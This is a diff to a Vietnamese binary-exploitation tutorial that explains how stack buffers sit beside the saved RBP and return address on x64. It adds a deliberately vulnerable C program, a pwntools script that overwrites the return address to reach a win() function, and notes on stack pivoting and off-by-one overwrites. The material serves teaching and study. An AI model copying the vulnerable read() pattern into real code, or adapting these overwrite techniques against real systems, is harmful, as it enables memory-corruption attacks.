@@ -491,16 +491,123 @@ log.info(f"Leaked Address (RIP): {hex(leak)}")
 
 ### 2. Sự Trộn Lẫn Chết Người Giữa Dữ Liệu và Luồng Điều Khiển
 
-Trên lý thuyết, dữ liệu người dùng (Non-control data) không bao giờ được phép chi phối luồng thực thi (Control flow) của chương trình. Tuy nhiên, kiến trúc Von Neumann và cấu trúc của Ngăn xếp (Stack) lại trộn lẫn tất cả chúng vào cùng một nơi.
+Đây là phần "xương sống" của kỹ thuật khai thác lỗ hổng nhị phân (Binary Exploitation). Chúng ta sẽ mổ xẻ sự trộn lẫn giữa **Dữ liệu (Data)** và **Điều khiển (Control)** trên kiến trúc x64.
 
-Trên kiến trúc x64, khi một hàm được gọi, Stack Frame của nó thường được sắp xếp như sau (từ địa chỉ cao xuống địa chỉ thấp):
-*   **Return Address (8 bytes):** Địa chỉ lệnh tiếp theo (`RIP` sẽ nhảy tới đây sau khi hàm gọi lệnh `ret`).
-*   **Saved RBP (8 bytes):** Base pointer của hàm gọi trước đó.
-*   **Các biến cục bộ (Local Variables & Buffers).**
+---
 
-Mọi thứ nằm sát cạnh nhau. Nếu một biến cục bộ bị ghi đè vượt giới hạn (Buffer Overflow), dữ liệu của kẻ tấn công sẽ tràn dần lên địa chỉ cao hơn, ghi đè lên `Saved RBP` và quan trọng nhất là **Return Address**. 
+#### Cấu trúc Stack Frame x64
 
-Khi hàm kết thúc, lệnh `ret` được thực thi. Lệnh này đơn giản là `pop rip` – lấy 8 bytes tại đỉnh stack hiện tại và nhét vào thanh ghi lệnh `RIP`. Nếu chúng ta đè Return Address bằng một địa chỉ tùy ý, chương trình sẽ ngoan ngoãn nhảy đến đó. Lịch sử đã chứng minh mức độ tàn phá của cơ chế này bằng sự kiện Morris Worm năm 1988 (làm sập toàn bộ Internet bằng việc khai thác hàm `gets` trong sendmail/fingerd). Ngày nay, thao tác hijack `RIP` này là bước đầu tiên để thiết lập một chuỗi ROP (Return-Oriented Programming) tinh vi nhằm qua mặt các lớp bảo vệ của hệ điều hành.
+Trong x64 Linux, Stack phát triển về phía **địa chỉ thấp**, nhưng các hàm ghi bộ nhớ (như `read`, `gets`, `memcpy`) lại ghi về phía **địa chỉ cao**. Đây chính là "thiết kế lỗi" kinh điển cho phép dữ liệu ở dưới tràn lên đè các cấu trúc quản lý ở trên.
+
+**Sơ đồ Stack Frame của một hàm (Địa chỉ từ cao xuống thấp):**
+
+| Địa chỉ | Thành phần | Kích thước | Vai trò |
+| :--- | :--- | :--- | :--- |
+| **Cao** | **Return Address (RIP)** | 8 bytes | Địa chỉ để CPU quay về sau khi hàm kết thúc. **(Control Data)** |
+| | **Saved RBP** | 8 bytes | Base pointer của hàm cha. **(Control Data)** |
+| | **Padding / Alignment** | ? bytes | Trình biên dịch thêm vào để căn chỉnh 16-byte. |
+| **Thấp** | **Local Buffers (Dữ liệu)** | N bytes | Nơi chứa mảng, chuỗi người dùng nhập. **(Non-control Data)** |
+
+---
+
+#### Điểm cần chú ý của lỗ hổng: Lệnh `ret` và thanh ghi `RIP`
+
+Thanh ghi **RIP (Instruction Pointer)** là bộ não của CPU, nó chỉ đâu CPU chạy đó. Tuy nhiên, lập trình viên không thể ghi trực tiếp vào RIP (ví dụ: không có lệnh `mov rip, 0x41414141`). 
+
+Cách duy nhất để thay đổi RIP là thông qua các lệnh điều khiển luồng, và quan trọng nhất là lệnh **`ret`**.
+
+**Cơ chế của lệnh `ret`:**
+Khi một hàm kết thúc, nó thực thi lệnh `ret`. Lệnh này thực chất là:
+`pop rip`
+CPU sẽ lấy giá trị tại **đỉnh Stack hiện tại** ném vào thanh ghi RIP. Nếu chúng ta đã dùng Buffer Overflow để ghi đè cái giá trị trên Stack đó, chúng ta sẽ điều khiển được hướng đi của CPU.
+
+Ta hoàn toàn có thể bẻ lái luông thực thi về 1 đoạn code nào đó của chính chương trình (nằm trong `section .text`) hoặc 1 đoạn code ta chèn vào (nằm trong stack, hoặc heap,...)
+
+---
+
+#### Mã nguồn minh họa (The Vulnerability)
+
+```c
+// stack_control_mix.c
+#include <stdio.h>
+#include <unistd.h>
+
+void win() {
+    printf("Success! You've hijacked the control flow.\n");
+    _exit(0);
+}
+
+void vulnerable_function() {
+    char buffer[16]; // Buffer nhỏ
+    printf("Tell me something: ");
+    // LỖI: Đọc 128 bytes vào buffer 16 bytes
+    read(0, buffer, 128); 
+}
+
+int main() {
+    vulnerable_function();
+    printf("Back to main safely.\n");
+    return 0;
+}
+```
+
+---
+
+#### Phân tích cuộc tấn công (Exploit Steps)
+
+Để nhảy vào hàm `win()`, kẻ tấn công cần chế tạo một Payload có cấu trúc chính xác để "bắc cầu" từ buffer lên đến Return Address.
+
+**Payload Layout:**
+1.  **Junk Data (16 bytes):** Lấp đầy buffer `buffer[16]`.
+2.  **Saved RBP Overwrite (8 bytes):** Ghi đè 8 bytes của Base Pointer cũ (thường ghi bằng dữ liệu rác).
+3.  **Target Address (8 bytes):** Ghi đè địa chỉ của hàm `win()` vào vị trí của **Return Address**.
+
+**Dưới góc nhìn Assembly:**
+Khi `vulnerable_function` chuẩn bị kết thúc, nó thực hiện chuỗi lệnh Epilogue:
+```assembly
+leave    ; Tương đương: mov rsp, rbp; pop rbp (Khôi phục stack frame)
+ret      ; Tương đương: pop rip (LẤY GIÁ TRỊ ATTACKER ĐÃ GHI VÀO RIP)
+```
+
+---
+
+#### Mã khai thác (Exploit Code - Pwntools)
+
+```python
+from pwn import *
+
+# Chuẩn bị môi trường
+p = process('./stack_control_mix')
+elf = ELF('./stack_control_mix')
+
+# Tìm địa chỉ hàm win
+win_addr = elf.symbols['win']
+log.info(f"Target 'win' address: {hex(win_addr)}")
+
+# Chế tạo Payload
+# 16 bytes buffer + 8 bytes Saved RBP = 24 bytes rác
+payload = b"A" * 24
+payload += p64(win_addr) # Địa chỉ 8 bytes trỏ tới win()
+
+# Gửi payload
+p.sendlineafter(b"Tell me something: ", payload)
+
+# Nhận kết quả
+print(p.recvall().decode())
+```
+
+---
+
+#### Notes
+
+Trong thực tế, việc trộn lẫn này còn gây ra các lỗi tinh vi hơn mà bạn cần quan tâm:
+
+*   **Stack Pivoting (Bẻ lái Stack):** Nếu bạn không thể ghi đè Return Address nhưng có thể ghi đè **Saved RBP**, bạn có thể lừa CPU tin rằng Stack đang nằm ở một vị trí khác (do bạn kiểm soát). Khi lệnh `leave; ret` chạy, CPU sẽ nhảy sang "Stack giả" của bạn và thực thi chuỗi ROP tại đó.
+*   **Off-by-one Overwrite:** Đôi khi bạn chỉ ghi đè được đúng **1 byte** Null (`0x00`) vào `Saved RBP`. Trên kiến trúc Little Endian, byte này là byte thấp nhất (LSB). Việc này làm lệch địa chỉ của Stack Frame một khoảng nhỏ, khiến hàm cha khi kết thúc sẽ lấy Return Address từ một vị trí sai (nhưng do bạn kiểm soát). Đây là lỗi cực khó phát hiện khi audit code nhưng cực mạnh khi exploit.
+*   **Mixing Data and Pointers:** Không chỉ Return Address, trên Stack còn chứa các **Local Function Pointers**. Nếu một hàm gọi đến con trỏ nằm trên Stack, bạn chỉ cần overflow đến con trỏ đó mà không cần quan tâm đến `ret` hay `Canary`.
+
+**Câu hỏi cốt lõi:** 
+*"Trong vùng nhớ này, đâu là dữ liệu tôi nhập vào, và ngay sát nó có con trỏ nào, địa chỉ trả về nào, hay cấu trúc điều khiển nào không?"*
 
 ### 3. Vấn Đề Dữ Liệu Đóng Vai Trò Metadata (In-band Signaling)
 
